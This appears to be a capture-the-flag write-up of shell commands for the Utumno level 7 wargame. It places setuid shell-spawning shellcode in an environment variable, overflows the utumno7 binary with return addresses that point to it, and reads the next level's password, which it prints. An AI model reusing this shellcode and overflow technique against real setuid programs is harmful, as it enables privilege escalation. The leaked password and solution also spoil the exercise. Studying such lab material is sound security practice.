# Set the environment variables
# If you add too many \x90, the program runs weirdly, so I just add 4 \x90
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 4 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
# Get EGG's address
/tmp/utumno5_ballban/check_env EGG # 0xffffdddc
# I don't know why but everytime when I run other programs, the address of EGG swifts a little bit
# This time for gef, it shifts 44 and for utumno7 it shifts 24
gef /utumno/utumno7
run $(python3 -c "import sys; import struct; sys.stdout.buffer.write(b'A' * 0 +  struct.pack('<I', 0xffffdddc + 44) * 35)")

/utumno/utumno7 $(python3 -c "import sys; import struct; sys.stdout.buffer.write(struct.pack('<I', 0xffffdddc + 24) * 35)")

cat /etc/utumno_pass/utumno8
# Password: oqnM7PWFIn